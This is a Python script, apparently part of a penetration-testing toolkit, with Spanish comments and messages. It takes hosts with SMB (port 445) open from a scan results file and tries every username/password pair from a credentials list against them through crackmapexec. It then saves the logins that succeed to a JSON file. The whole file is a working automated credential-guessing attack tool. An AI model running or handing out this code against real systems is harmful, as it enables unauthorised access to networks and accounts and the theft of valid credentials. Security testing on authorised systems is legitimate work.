import subprocess
import json
import argparse
import itertools
import threading
import time
from datetime import datetime

stop_spinner = False

def spinner():
    spinner_cycle = itertools.cycle(["|", "/", "-", "\\"])
    while not stop_spinner:
        print(f"\r[+] Probando credenciales en SMB... {next(spinner_cycle)}", end="")
        time.sleep(0.2)  # Velocidad del spinner

def read_scan_results(input_file):
    with open(input_file, "r") as json_file:
        scan_data = json.load(json_file)
    smb_targets = []
    for host in scan_data["hosts"]:
        for port in host["open_ports"]:
            if port["port"] == 445:  # Verificar si tiene SMB abierto
                smb_targets.append(host["ip"])
    return smb_targets

def load_credentials(config_file):
    with open(config_file, "r") as json_file:
        credentials = json.load(json_file)
    return credentials

def test_smb_credentials(target_ip, username, password):
    global stop_spinner
    stop_spinner = False
    spinner_thread = threading.Thread(target=spinner)
    spinner_thread.start()  # Iniciar el spinner

    print(f"[+] Probando credenciales en {target_ip} → Usuario: {username}, Contraseña: {password}")
    cme_command = ["crackmapexec", "smb", target_ip, "-u", username, "-p", password]
    try:
        result = subprocess.run(cme_command, capture_output=True, text=True, check=True)
        stop_spinner = True  # Detener el spinner
        spinner_thread.join()

        if "STATUS_SUCCESS" in result.stdout:
            return "Access Granted"
        else:
            return "Access Denied"
    except subprocess.CalledProcessError as e:
        stop_spinner = True
        spinner_thread.join()
        print(f"[-] Error probando credenciales: {e}")
        return "Error"

def smb_credential_attack(input_file, output_file, config_file):
    smb_targets = read_scan_results(input_file)
    common_creds = load_credentials(config_file)

    all_creds_results = {}
    for target in smb_targets:
        creds_results = []
        success_creds = []
        for cred in common_creds:
            result = test_smb_credentials(target, cred["user"], cred["pass"])
            attempt_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            creds_results.append({
                "user": cred["user"],
                "pass": cred["pass"],
                "status": result,
                "time": attempt_time
            })
            if result == "Access Granted":
                success_creds.append({"user": cred["user"], "pass": cred["pass"]})
        all_creds_results[target] = {
            "status": "Partially Successful" if success_creds else "Failed",
            "tested_credentials": creds_results,
            "successful_credentials": success_creds
        }
    
    with open(output_file, "w") as json_file:
        json.dump(all_creds_results, json_file, indent=4)
    
    print(f"[+] Resultados de credenciales SMB guardados en {output_file}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Prueba de Credenciales Comunes en SMB")
    parser.add_argument("--input", required=True, help="Archivo JSON del reconocimiento (scan_results.json)")
    parser.add_argument("--output", default="smb_creds.json", help="Archivo de salida para guardar resultados")
    parser.add_argument("--config", default="credentials.json", help="Archivo de configuración de credenciales")
    args = parser.parse_args()
    
    smb_credential_attack(args.input, args.output, args.config)
